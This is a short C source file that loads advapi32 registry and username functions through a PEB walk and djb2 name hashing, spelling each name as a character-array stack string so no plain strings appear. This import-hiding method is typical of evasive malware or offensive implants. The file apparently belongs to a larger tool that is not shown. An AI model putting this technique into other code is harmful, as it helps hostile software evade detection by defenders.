#include "advapi.h"
#include "system.h"
#include "djb2.h"

BOOL ADVAPI_Ctor(PADVAPI advapi)
{
    if (advapi == NULL)
        return FALSE;
    PVOID module = GetModuleHandleFromPEB(Hash((WCHAR[]){L'a', L'd', L'v', L'a', L'p', L'i', L'3', L'2', L'.', L'd', L'l', L'l', L'\0'}));

    advapi->RegOpenKeyExA = (LSTATUS (WINAPI *)(HKEY, const PCHAR, DWORD, REGSAM, HKEY*))
        ResolveExportByHash(module, Hash((WCHAR[]){L'R', L'e', L'g', L'O', L'p', L'e', L'n', L'K', L'e', L'y', L'E', L'x', L'A', L'\0'}));
    advapi->RegQueryValueExA = (LSTATUS (WINAPI *)(HKEY, const PCHAR, DWORD*, DWORD*, unsigned char*, DWORD*))
        ResolveExportByHash(module, Hash((WCHAR[]){L'R', L'e', L'g', L'Q', L'u', L'e', L'r', L'y', L'V', L'a', L'l', L'u', L'e', L'E', L'x', L'A', L'\0'}));
    advapi->RegCloseKey = (LSTATUS (WINAPI *)(HKEY))
        ResolveExportByHash(module, Hash((WCHAR[]){L'R', L'e', L'g', L'C', L'l', L'o', L's', L'e', L'K', L'e', L'y', L'\0'}));
    advapi->GetUserNameA = (BOOL (WINAPI *)(PCHAR, DWORD *))
        ResolveExportByHash(module, Hash((WCHAR[]){L'G', L'e', L't', L'U', L's', L'e', L'r', L'N', L'a', L'm', L'e', L'A', L'\0'}));

    return (advapi->RegOpenKeyExA != NULL && advapi->RegQueryValueExA != NULL && advapi->RegCloseKey != NULL && advapi->GetUserNameA != NULL);
}
